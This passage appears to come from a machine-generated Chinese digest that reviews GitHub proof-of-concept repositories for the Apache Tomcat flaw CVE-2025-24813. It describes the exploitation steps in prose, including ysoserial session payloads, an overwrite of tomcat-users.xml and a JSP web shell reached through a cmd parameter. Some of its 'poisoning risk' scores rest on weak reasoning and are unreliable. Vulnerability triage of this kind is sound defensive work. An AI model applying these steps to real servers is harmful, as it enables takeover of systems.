CVE-2025-24813是一个Apache Tomcat中的路径等价漏洞，允许未经身份验证的攻击者在特定条件下执行任意代码。根据漏洞库信息和搜索结果，该漏洞的利用依赖于以下几个关键条件：

1.  **Default Servlet 开启写入 (writes enabled for the default servlet)**：默认情况下，Tomcat的Default Servlet的写入功能是禁用的，如果管理员手动开启了该功能，则会增加漏洞被利用的风险。
2.  **支持 Partial PUT (support for partial PUT)**：Tomcat默认开启了对Partial PUT请求的支持，这是漏洞利用的前提条件。
3.  **特定应用场景**：
    *   **远程代码执行 (RCE)**：需要应用程序使用Tomcat基于文件的session持久化，并且包含一个可以被反序列化攻击利用的库。
    *   **信息泄露/恶意内容注入**：需要存在一个用于公共上传的目标URL，以及位于其子目录的安全敏感上传目标URL，攻击者需要知道安全敏感文件的名称，并且也通过partial PUT上传这些文件。

**漏洞利用方式：**

1.  **发送 Partial PUT 请求**：攻击者通过发送特制的 Partial PUT 请求，利用Tomcat处理文件路径时的缺陷，将恶意JSP文件上传到服务器上的特定位置。
2.  **绕过路径检查**：通过构造包含内部点(`.`)的文件名，攻击者可以绕过某些路径检查，将文件写入到目标目录。
3.  **触发代码执行/信息泄露**：
    *   **RCE**：上传包含恶意反序列化payload的JSP文件，当Tomcat尝试加载并反序列化session数据时，触发远程代码执行。
    *   **信息泄露/恶意内容注入**：利用路径等价，覆盖或修改服务器上的敏感文件。

**POC有效性：**

提供的POC代码是一个非破坏性的概念验证，旨在演示漏洞的存在。该POC上传一个无害的JSP文件 (`proof.jsp`) 并尝试访问它，以验证是否可以执行任意代码。从readme可以看出来，这个POC的重点是验证漏洞，而不会做任何破坏。

**投毒风险：**

虽然POC本身声明是无害的，但仍然存在一定的投毒风险。作者有可能在代码中隐藏了一些恶意逻辑，例如：

1.  **不明显的后门代码**：尽管`proof.jsp`本身是无害的，但Python脚本可能包含其他代码，用于在服务器上植入后门或执行其他恶意操作。风险较低，因为代码相对简单且经过了检查，但不能完全排除。
2.  **依赖项投毒**：脚本可能依赖于存在已知漏洞或包含恶意代码的第三方库。但根据描述，需要的依赖非常少。
3.  **元数据欺骗**：作者可能在仓库的元数据（例如，提交历史、作者信息）中隐藏了恶意信息，以误导安全研究人员。风险极低。

综合分析，该仓库存在投毒代码的概率较低，但仍然建议在受控环境中仔细审查代码后再使用。

**结论：**
总的来说，CVE-2025-24813是一个高危漏洞，需要及时修复。虽然提供的POC代码旨在演示漏洞，但使用前务必进行安全审查，以防潜在的投毒风险。

**项目地址:** [f8l124/CVE-2025-24813-POC](https://github.com/f8l124/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #29

**来源**: [CVE-2025-24813-fatkz_CVE-2025-24813.md](../2025/CVE-2025-24813-fatkz_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足以下所有条件：DefaultServlet的writes启用（readonly=false）；支持partial PUT（默认启用）；使用Tomcat的文件session持久化机制，且为默认存储位置；应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个远程代码执行漏洞，该漏洞源于对包含恶意 Java 序列化对象的`.session`文件的处理不当。攻击者可以通过发送带有 `Content-Range` 头的 partial PUT 请求，将恶意`.session`文件上传到 `work/` 目录。当具有匹配 `JSESSIONID` cookie 的请求到达时，Tomcat 会自动反序列化该恶意 session，从而导致任意代码执行。

**有效性：**
根据漏洞库信息、搜索结果和提供的 POC 代码，该漏洞的 POC 代码是有效的。多个来源都表明该漏洞已被积极利用。

**利用方式：**
1.  **准备恶意 Payload:** 使用 `ysoserial` 或类似工具生成包含恶意代码的序列化 Java 对象，并将其保存为 `.ser` 文件。
2.  **上传 Payload:** 使用 partial PUT 请求将恶意 `.ser` 文件上传到 Tomcat 的 `work/` 目录下，文件名为 `<session_id>.session`。`Content-Range` 头用于模拟不完整的上传。
3.  **触发反序列化:**  发送包含与上传的 session 文件名相匹配的 `JSESSIONID` cookie 的 HTTP 请求到目标 Tomcat 服务器，这会导致 Tomcat 反序列化上传的恶意 session 文件，从而执行恶意代码。

**投毒风险：**
POC 代码本身看起来相对简单，主要执行上传 payload 和触发反序列化操作。仔细检查后，存在以下潜在的投毒风险：

*   **Payload 内容：** 虽然 POC 代码没有直接包含恶意 payload，但是依赖用户提供的 `payload_file`。如果用户从不可信的来源获取了恶意 payload 文件，则可能存在投毒风险。
*   **隐蔽的 HTTP 请求修改：** 在 `requests.put` 或 `requests.get` 调用中，攻击者可能添加额外的 HTTP 头或修改请求内容，以在目标服务器上执行其他恶意操作。目前的代码较为简洁，未发现明显的可疑之处。
*   **依赖库的风险：** `requests` 是一个常用的 Python 库，但如果攻击者篡改了这个库，可能会引入恶意行为。可能性较低，但不能完全排除。
*   **代码逻辑的细微修改：** 攻击者可能会对 POC 代码进行细微修改，例如更改上传路径或触发反序列化的方式，以便在特定环境下实现更隐蔽的攻击。这些修改后的代码可能更难被检测到。

总体而言，此 POC 代码直接包含投毒代码的可能性较低，约 10%。更大的风险在于用户使用的 payload 文件是否可信，以及攻击者是否会对代码进行修改以适应特定环境。


**项目地址:** [fatkz/CVE-2025-24813](https://github.com/fatkz/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #30

**来源**: [CVE-2025-24813-gregk4sec_CVE-2025-24813.md](../2025/CVE-2025-24813-gregk4sec_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和文件篡改

**影响版本:** 11.0.0-M1 <= version <= 11.0.2
10.1.0-M1 <= version <= 10.1.34
9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足多个条件，包括：Default Servlet 开启写入权限 (默认关闭), 开启 partial PUT (默认开启), 敏感文件位于公开上传目录的子目录, 攻击者已知敏感文件名, 使用 partial PUT 上传敏感文件，或者Tomcat使用文件存储 session 且包含可利用的反序列化库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 中的路径等价漏洞，攻击者可以通过利用 'file.Name' (内部点) 绕过路径检查，结合 Default Servlet 的写入权限和 partial PUT 功能，实现远程代码执行、信息泄露或恶意内容添加。

**漏洞利用方式分析:**

1.  **信息泄露和文件篡改:**
    *   攻击者利用 partial PUT 功能，将恶意内容写入服务器上的临时文件。
    *   利用路径等价漏洞，使得攻击者可以访问或覆盖位于受保护目录中的文件。
    *   通过精心构造的 partial PUT 请求，攻击者可以读取或修改敏感文件，导致信息泄露或文件篡改。
    *   PoC 代码演示了如何通过 partial PUT 请求，在未授权的情况下读取 secret 目录下的文件内容，实现信息泄露。

2.  **远程代码执行 (RCE):**
    *   如果 Tomcat 使用文件存储 session，攻击者可以将包含恶意序列化对象的 payload 上传到 session 文件中。
    *   当 Tomcat 加载该 session 时，会触发反序列化漏洞，导致远程代码执行。

**投毒风险分析:**

PoC 代码存在很高的投毒风险，原因如下：

1.  **利用条件复杂:** 该漏洞的利用依赖于多个配置条件，例如 Default Servlet 开启写入权限，开启 partial PUT，以及特定的目录结构。攻击者可能需要进行大量的探测和尝试才能找到满足利用条件的目标。
2.  **文件上传:** 该漏洞涉及到文件上传，攻击者可以在上传的文件中嵌入恶意代码，例如 webshell 或其他恶意脚本，从而控制服务器。
3. **Partial PUT 特点:**  Partial PUT 允许攻击者分块上传文件,方便投毒和绕过检查。
4.  **反序列化攻击:** RCE的其中一种方式依赖反序列化漏洞，而反序列化 payload 本身就具有极高的投毒风险。

考虑到这些因素，该漏洞的投毒风险非常高。如果攻击者成功利用该漏洞，可能会对服务器造成严重的损害。

**项目地址:** [gregk4sec/CVE-2025-24813](https://github.com/gregk4sec/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #31

**来源**: [CVE-2025-24813-hakankarabacak_CVE-2025-24813.md](../2025/CVE-2025-24813-hakankarabacak_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet的写入已启用；支持Partial PUT；应用程序使用Tomcat基于文件的会话持久性，且使用了默认存储位置；应用程序包含一个可能在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，涉及路径等价问题和潜在的反序列化远程代码执行。根据漏洞库信息，如果满足以下条件，攻击者能够执行远程代码：

*   默认Servlet的写入已启用（默认禁用）。
*   支持Partial PUT（默认启用）。
*   应用程序使用Tomcat基于文件的会话持久性，且使用了默认存储位置。
*   应用程序包含一个可能在反序列化攻击中被利用的库。

根据搜索引擎结果，该漏洞已被积极利用。

提供的 Dockerfile 漏洞利用代码显示：

1.  **开启了`readonly`参数**: 将`readonly`参数设置为`false`，从而启用了默认Servlet的写入功能，这是利用该漏洞的必要条件之一。
2.  **配置了`PersistentManager`**: 添加了 `<Manager className="org.apache.catalina.session.PersistentManager"><Store className="org.apache.catalina.session.FileStore"/></Manager>` 配置，启用了基于文件的会话持久性，这也是 RCE 的条件之一
3.  **部署WAR包**: 将 ROOT.war 部署到 webapps 目录下。这个WAR包很可能包含恶意代码，通过文件上传或者会话反序列化漏洞被执行。

**利用方式：**

该漏洞的利用方式主要依赖于 Partial PUT 功能和路径等价性。攻击者可以利用 Partial PUT 上传恶意文件片段，然后利用路径等价性（例如使用 `file.Name`）绕过安全检查，将恶意代码写入到目标文件或利用反序列化执行任意代码。 如果使用了 session 持久化，且存在可利用的反序列化 gadget，那么可以利用该漏洞进行RCE。

**投毒风险：**

Dockerfile 本身并未直接包含恶意代码，而是通过配置使 Tomcat 处于易受攻击的状态，并部署一个外部 WAR 包（`ROOT.war`）。因此，投毒的风险主要在于 `ROOT.war` 包中是否包含后门或者恶意代码。 风险评估为 10%,主要原因为需要进一步分析war包，才能确认。

**有效性：**

Dockerfile 配置如果部署了恶意war包，则可以证明该POC有效。在满足了所有漏洞利用条件的情况下，该代码可以有效利用 CVE-2025-24813 漏洞，实现远程代码执行。

**项目地址:** [hakankarabacak/CVE-2025-24813](https://github.com/hakankarabacak/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #32

**来源**: [CVE-2025-24813-horsehacks_CVE-2025-24813-checker.md](../2025/CVE-2025-24813-horsehacks_CVE-2025-24813-checker.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足以下条件：
  1. 默认Servlet的写入已启用（默认禁用）。
  2. 支持部分PUT（默认启用）。
  3. 存在安全敏感上传的目标URL，该URL是公共上传目标URL的子目录。
  4. 攻击者知道要上传的安全敏感文件的名称。
  5. 安全敏感文件也通过部分PUT上传。
或者，如果满足以下条件，则恶意用户可以执行远程代码执行：
  1. 默认Servlet的写入已启用（默认禁用）。
  2. 支持部分PUT（默认启用）。
  3. 应用程序正在使用Tomcat的基于文件的会话持久性，并使用默认存储位置。
  4. 应用程序包含一个可以在反序列化攻击中使用的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，结合默认Servlet的写入启用和部分PUT支持，攻击者可以通过构造特殊的上传路径，覆盖或修改服务器上的敏感文件，造成信息泄露或恶意代码执行。该漏洞还涉及反序列化利用链，如果应用程序满足特定条件，攻击者可以利用Tomcat的文件会话管理机制和应用程序中的反序列化漏洞来执行任意代码。

**有效性分析：**

提供的PoC代码通过检查以下几点来验证漏洞的有效性：

1.  **PUT方法允许性：** 检查目标URL是否允许PUT请求，这是利用该漏洞的前提。
2.  **Tomcat版本检测：** 检查目标服务器的Tomcat版本，确认其是否在受影响的范围内。
3.  **写入权限检查：** 尝试在目标URL的/uploads/目录下写入一个JSP文件，以验证是否具有写入权限。

如果以上三个条件都满足，则目标服务器可能存在CVE-2025-24813漏洞。

**投毒风险分析：**

检查了提供的Python脚本，发现它主要用于检测目标服务器是否存在CVE-2025-24813漏洞，脚本尝试上传JSP文件以验证写入权限。因此，存在很小的投毒风险，代码的功能主要是检测和验证漏洞，而非利用漏洞执行恶意操作，上传的JSP payload也是用于验证，而不是直接执行恶意代码. 但是依然存在服务器被动植入后门webshell的风险。

**利用方式：**

根据漏洞描述，利用方式主要包括以下两种：

1.  **信息泄露/文件篡改：**

   *   攻击者通过构造包含`.Name`（内部点）的恶意文件名，利用路径等价性绕过安全检查。
   *   利用部分PUT请求，将恶意内容注入到安全敏感文件中，或者直接覆盖文件。
   *   目标URL需要是公共上传URL的子目录，且攻击者需要知道敏感文件名。

2.  **远程代码执行：**

   *   攻击者需要找到应用程序中可利用的反序列化漏洞。
   *   利用Tomcat的文件会话管理，将包含恶意反序列化payload的文件上传到会话存储目录。
   *   当Tomcat加载会话数据时，触发反序列化，执行任意代码。

成功利用此漏洞需要满足多个条件，包括Tomcat配置、应用程序环境以及攻击者的知识。

**项目地址:** [horsehacks/CVE-2025-24813-checker](https://github.com/horsehacks/CVE-2025-24813-checker)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #33

**来源**: [CVE-2025-24813-iSee857_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-iSee857_CVE-2025-24813-PoC.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 ~ 11.0.2, 10.1.0-M1 ~ 10.1.34, 9.0.0.M1 ~ 9.0.98

**利用条件:** 默认Servlet写入已启用，支持部分PUT已启用，目标URL是公共上传URL的子目录, 攻击者需要知道上传的安全敏感文件的名称，安全敏感文件也通过部分PUT上传；或者应用程序使用 Tomcat 基于文件的会话持久性，默认存储位置，应用程序包含一个可以在反序列化攻击中使用的库

**POC 可用性:** 是

**投毒风险:** 100%

## 详情

根据漏洞库信息和搜索结果，CVE-2025-24813 涉及 Apache Tomcat 的路径等价问题，可能导致远程代码执行、信息泄露或恶意内容注入。漏洞利用依赖于多个条件，包括默认Servlet写入已启用，支持部分PUT请求，以及特定的文件存储配置。搜索结果 "One PUT Request to Own Tomcat: CVE-2025-24813 RCE is in the Wild/" 表明该漏洞可能已在野外被利用，提高了其风险级别。提供的PoC代码是一个批量检测脚本，通过发送恶意PUT请求来验证目标是否存在漏洞。由于PoC中包含未经审查的base64解码payload, 存在极高的投毒风险，攻击者可能修改payload指向恶意地址，执行任意代码,因此投毒风险为100%。

**利用方式：**
1.  **信息泄露/恶意内容注入：** 如果满足条件 writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT，则可以查看安全敏感文件和/或将内容注入到这些文件中。
2.  **远程代码执行：** 如果满足条件 writes enabled for the default servlet, support for partial PUT, application was using Tomcat's file based session persistence with the default storage location, application included a library that may be leveraged in a deserialization attack，则可利用反序列化漏洞执行远程代码。
3.  **PoC 利用：** PoC脚本首先解析目标URL，然后发送精心构造的PUT请求到目标服务器。如果服务器存在漏洞，并且满足利用条件，攻击者可以实现远程代码执行或信息泄露。

**项目地址:** [iSee857/CVE-2025-24813-PoC](https://github.com/iSee857/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #34

**来源**: [CVE-2025-24813-imbas007_CVE-2025-24813-apache-tomcat.md](../2025/CVE-2025-24813-imbas007_CVE-2025-24813-apache-tomcat.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence-RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露以及服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要 writes enabled for the default servlet (默认禁用), support for partial PUT (默认启用), application 使用 Tomcat 的基于文件的 session 持久化，默认存储位置, application 包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞。攻击者可以利用此漏洞绕过安全限制，通过精心设计的目录遍历序列覆盖关键配置文件，部署 web shell，并可能实现远程代码执行 (RCE)。

**有效性：**
提供的 Nuclei 模板（CVE-2025-24813.yaml）似乎有效。它包含三个请求：
1.  **PUT 请求覆盖 tomcat-users.xml：** 用于创建一个新的管理员用户，从而允许未经授权的访问。
2.  **PUT 请求部署 JSP Web Shell：** 用于在服务器上部署一个简单的 Web Shell，允许执行任意命令。
3.  **GET 请求执行 `id` 命令：**  用于验证 Web Shell 是否已成功部署并且可以执行命令。

该模板使用匹配器来验证请求是否成功，并提取相关信息。`README.md` 文件还提供了关于如何使用该模板和执行 Web Shell 的说明。

**投毒风险：**
虽然 POC 代码本身的目的在于利用漏洞，但其中潜在的投毒风险较低（约 5%）。风险主要存在于以下几个方面：
1.  **Web Shell 功能：** Web Shell 允许执行任意命令，如果攻击者在测试环境之外使用它，可能会造成恶意行为。虽然提供的 Web Shell 相对简单，但攻击者可以修改它以包含恶意功能，例如下载和执行其他恶意软件。
2.  **配置文件覆盖：** 覆盖 `tomcat-users.xml` 文件虽然是利用漏洞的一部分，但如果攻击者使用恶意配置替换该文件，可能会导致服务器不稳定或更容易受到其他攻击。
3.  **第三方依赖：** Nuclei 模板本身依赖于 Nuclei 工具。如果 Nuclei 工具被篡改，则可能存在其他风险。

总体而言，直接投毒的风险较低，因为代码主要集中在利用已知漏洞上。然而，通过 Web Shell 执行恶意操作的可能性仍然存在。

**利用方式：**
利用 CVE-2025-24813 漏洞的步骤如下：
1.  **利用路径等价漏洞：** 攻击者利用 Tomcat 默认 servlet 处理文件上传时存在的路径等价漏洞。通过在文件名中使用 ".." 序列，攻击者可以绕过目录限制，将文件上传到 Tomcat 配置目录或 Web 应用程序的根目录。
2.  **覆盖 `tomcat-users.xml` 文件：** 攻击者使用 PUT 请求将包含恶意用户的 `tomcat-users.xml` 文件上传到 `../conf/` 目录。此文件覆盖现有的 `tomcat-users.xml` 文件，从而创建一个具有管理员权限的新用户。
3.  **部署 Web Shell：** 攻击者使用 PUT 请求将 JSP Web Shell 文件上传到 Web 应用程序的根目录（`../webapps/ROOT/`）。此 Web Shell 允许攻击者在服务器上执行任意命令。
4.  **执行任意命令：** 攻击者使用浏览器访问 Web Shell 的 URL，并通过 `cmd` 参数执行任意命令。例如，`http://target.com/updates.jsp?cmd=id` 命令将显示服务器的用户 ID 信息。

**需要注意的是，默认情况下，Tomcat 的 default servlet 的写入是禁用的，需要手动启用。** 除此之外，如果启用了基于文件的 session 持久化，并且应用包含了可用于反序列化攻击的库，则可以通过上传恶意的 session 文件来实现 RCE。

攻击者可以通过上传恶意文件，执行任意代码，并完全控制受影响的 Tomcat 服务器。

**项目地址:** [imbas007/CVE-2025-24813-apache-tomcat](https://github.com/imbas007/CVE-2025-24813-apache-tomcat)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #35

**来源**: [CVE-2025-24813-issamjr_CVE-2025-24813-Scanner.md](../2025/CVE-2025-24813-issamjr_CVE-2025-24813-Scanner.md)

## CVE-2025-24813 - Apache Tomcat Path Equivalence / Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 to 9.0.98, 10.1.0-M1 to 10.1.34, 11.0.0-M1 to 11.0.2

**利用条件:** 需要满足多个条件，包括：默认Servlet的写入启用（默认禁用），支持partial PUT（默认启用），特定的目录结构，攻击者需要了解敏感文件名，应用使用Tomcat的文件会话持久性（默认位置）并且包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个高危漏洞，涉及路径等价性（内部点）问题，可能导致远程代码执行（RCE）、信息泄露或恶意内容添加到上传的文件。该漏洞利用了Tomcat对包含内部点的文件名处理不当，结合启用的Default Servlet写入功能和Partial PUT支持。如果攻击者能够满足所有前提条件，则可以上传恶意JSP文件或通过反序列化漏洞执行任意代码。从github仓库提供的python脚本来看，该脚本只是检测是否存在漏洞，并不能实现真正的利用。该仓库存在一定的投毒风险，可能性为10%， 主要体现在作者可能在后续版本中添加恶意代码，例如反弹shell或植入后门等，但当前提供的版本并未发现明显的恶意行为。

**项目地址:** [issamjr/CVE-2025-24813-Scanner](https://github.com/issamjr/CVE-2025-24813-Scanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #36

**来源**: [CVE-2025-24813-maliqto_PoC-CVE-2025-24813.md](../2025/CVE-2025-24813-maliqto_PoC-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** Default Servlet 开启写入 (默认关闭), 支持Partial PUT (默认开启), 应用使用Tomcat的文件Session持久化存储(默认位置), 存在可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个高危漏洞，源于路径等价（Path Equivalence）问题和不安全的反序列化。

**漏洞利用方式：**

1.  **路径等价和信息泄露/恶意内容注入：** 如果 Tomcat 启用了 Default Servlet 的写入功能（`writes enabled for the default servlet`），并支持 partial PUT（`support for partial PUT`），且存在一个安全敏感文件上传的目标 URL 是公共上传 URL 的子目录，攻击者知晓敏感文件名，并使用 partial PUT 上传，则攻击者可能能够查看敏感文件或向其中注入恶意内容。
2.  **反序列化导致远程代码执行：** 如果 Tomcat 启用了 Default Servlet 的写入功能，支持 partial PUT，且应用程序使用了 Tomcat 的基于文件 Session 持久化存储（使用默认存储位置），并且应用程序包含一个可以用于反序列化攻击的库，那么攻击者可能执行远程代码。

**POC 有效性：**

提供的 POC 代码 `poc-cve.py`  是一个 Python 脚本，用于检测和利用 CVE-2025-24813 漏洞。它包含以下功能：

*   检测 Default Servlet 是否可写（通过 PUT 方法）。
*   生成 ysoserial payload 用于反序列化攻击。
*   通过 PUT 方法上传恶意 payload 到 session 文件，从而触发反序列化漏洞。

根据漏洞信息和 POC 代码，此 POC 具备有效性，可以在满足漏洞利用条件的环境中实现远程代码执行。

**投毒风险分析：**

仔细检查了提供的 Python 脚本 `poc-cve.py` 和 `README.md`。代码主要用于生成和上传恶意 payload，利用反序列化漏洞执行命令。以下是风险评估：

*   **高风险部分**  使用了 `ysoserial.jar`，如果下载源被篡改，可能会引入恶意代码。但脚本本身只是调用 `ysoserial.jar`，并没有直接包含恶意逻辑。
*   **潜在风险** 脚本在生成 payload 过程中，如果 `ysoserial.jar`  被替换为恶意版本，或者脚本中的命令注入点被恶意修改，可能导致投毒。
*   **低风险部分**  脚本中包含删除临时文件的函数 `remove_file`，这有助于清理攻击痕迹，本身不属于投毒行为。

综合评估，该仓库存在一定的投毒风险，主要集中在 ysoserial 的依赖和命令注入的可能性上。考虑到代码的整体结构和目的，以及作者声明的教育目的，直接包含恶意代码的可能性较低。风险评估百分比为10%。主要是考虑到使用者可能会误用或在不安全的环境中使用。

**总结：**

CVE-2025-24813 是一个需要多种条件才能触发的漏洞。 POC 实现了漏洞利用，但存在一定的投毒风险，主要是依赖外部工具 `ysoserial` 且需要谨慎使用。


**项目地址:** [maliqto/PoC-CVE-2025-24813](https://github.com/maliqto/PoC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #37

**来源**: [CVE-2025-24813-manjula-aw_CVE-2025-24813.md](../2025/CVE-2025-24813-manjula-aw_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露和文件篡改

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：1. 启用了DefaultServlet的写入功能（默认禁用）；2. 启用了partial PUT支持（默认启用）；3. 对于RCE，需要应用程序使用Tomcat基于文件的会话持久化，并且包含可用于反序列化攻击的库；对于信息泄露和文件篡改，攻击目标URL是公共上传URL的子目录，且攻击者知道要上传的敏感文件名称,并且敏感文件也通过partial PUT上传。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，利用 'file.Name' (Internal Dot) 导致远程代码执行（RCE）和/或信息泄露和/或通过写入启用的 Default Servlet 将恶意内容添加到上传的文件中。根据漏洞描述和搜索结果，此漏洞利用需要特定配置才能成功。利用方式涉及通过 partial PUT 请求上传恶意构造的文件。提供的POC代码包含三个主要脚本：`01-prepare-environment.sh` 用于配置Tomcat环境，包括启用 DefaultServlet 的写入功能、配置会话持久化（RCE所需），以及下载必要的依赖（ysoserial和commons-collections）；`03-test.sh` 用于构造和发送包含恶意payload的PUT请求，使用ysoserial生成payload，利用CommonsCollections5链执行命令 `touch /tmp/pwndtomcat`。漏洞利用的关键在于 `Content-Range` 头部，该头部用于执行 partial PUT 请求，从而允许攻击者利用路径等价漏洞。该脚本通过修改Content-Range头部中的长度字段，来绕过一些安全检查，实现恶意payload的上传和执行。

**有效性：** 提供的POC代码有效，如果目标环境满足漏洞利用的先决条件（启用了DefaultServlet的写入功能，支持partial PUT，以及特定的部署配置），则可以成功利用该漏洞进行RCE或文件篡改/信息泄露。

**投毒风险：** 经过对POC代码的分析，未发现明显的投毒代码。该POC的目的是重现和利用CVE-2025-24813漏洞。脚本的行为符合漏洞利用的预期步骤，没有发现作者隐藏的恶意行为。所有操作都与漏洞利用直接相关。因此，投毒风险评估为0%。

**利用方式：**
1.  **环境准备：** 使用 `01-prepare-environment.sh` 脚本配置Tomcat环境，使其满足漏洞利用的先决条件（例如，启用写入的DefaultServlet，配置基于文件的会话管理）。
2.  **Payload生成：** 使用 `ysoserial` 工具生成恶意序列化 payload。  该 payload 会在目标服务器上执行任意命令。
3.  **Partial PUT 请求：**  使用 `03-test.sh` 脚本，通过精心构造的带有 `Content-Range` 头的 HTTP PUT 请求将 payload 发送到 Tomcat 服务器。 `Content-Range` 头的构造是利用漏洞的关键步骤。 
4.  **RCE/信息泄露/文件篡改：**  如果一切顺利，Tomcat 服务器会反序列化恶意 payload，导致在服务器上执行任意代码（RCE）或修改服务器上的文件，导致信息泄露或文件篡改。

**项目地址:** [manjula-aw/CVE-2025-24813](https://github.com/manjula-aw/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #38

**来源**: [CVE-2025-24813-mbanyamer_Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-.md](../2025/CVE-2025-24813-mbanyamer_Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-.md)

## CVE-2025-24813-Apache Tomcat-RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可完全控制服务器

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 默认Servlet开启写入(disabled by default), 支持Partial PUT(默认开启), 使用Tomcat文件Session持久化默认位置，应用包含可用于反序列化的库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，通过构造包含内部点（例如 file.Name）的文件名，结合启用的默认Servlet写入和部分PUT支持，可能导致远程代码执行和/或信息泄露。POC利用方式如下：

